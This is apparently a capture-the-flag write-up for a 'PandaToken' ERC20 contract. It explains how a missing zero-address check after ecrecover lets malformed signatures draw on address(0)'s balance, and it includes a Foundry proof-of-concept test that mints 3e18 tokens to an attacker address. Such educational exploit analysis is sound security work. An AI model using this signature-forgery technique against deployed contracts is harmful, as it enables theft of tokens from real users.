************ Personal analysis and explainer ************
The PandaToken contract implements a standard ERC20 token with a special functionality:
users are able to asynchronously send tokens by signing a message which specifies the 
receiver and the amount of tokens to be transferred: when a receiver calls this function
with a valid signature, the tokens are minted to his address and the same amount of tokens
are saved to be burned from the sender's address.
The vulnerable function in this case is the `getTokens(uint, bytes)` function.
At first, it calculates the amount of tokens to be minted to the receiver, using the
`calculateAmount(uint)` function which, upon close inspection, is found to simply return 
the amount passed as a parameter.
After that, the `getTokens()` function decomposes the received signature in it's v, r, s fields
and tries to verify it against the message formed by msg.sender and the tokens to be minted.
Here lies the contract's vulnerability: when executing `ecrecover()`, if a signature fails 
to be verified, the returned address is the zero address. In this contract, this case is not
checked for (e.g. using `require(giftFrom != address(0))`).
This issue, in combination with the fact address(0) is given 10 PND by executing the 
PandaToken constructor (as is understandable from the first 5 lines in the PandaToken constructor),
allows an attacker to submit a malformed signature, which will assign `giftFrom = address(0)`, which
in turn will pass `getTokens()`'s second require statement which checks `balanceOf(giftFrom)`.
Given that used signatures are saved in the contract's state so that they are not replayed,
an attacker needs to build 3 malicious signatures, each extracting 1e18 PND tokens.
At the end, the attacker is able to achieve his goal of having 3e18 PND.

************ PoC test case ************
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        /* maliciousV is used to force an error in ecrecover, making it return address(0), which has 10 PND */
        for (uint8 maliciousV = v - 1; pandatoken.balanceOf(hacker) != 3 ether; --maliciousV) {
            bytes memory signature = abi.encode(r, s, maliciousV);
            pandatoken.getTokens(1 ether, signature);    
        }
        vm.stopPrank();

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}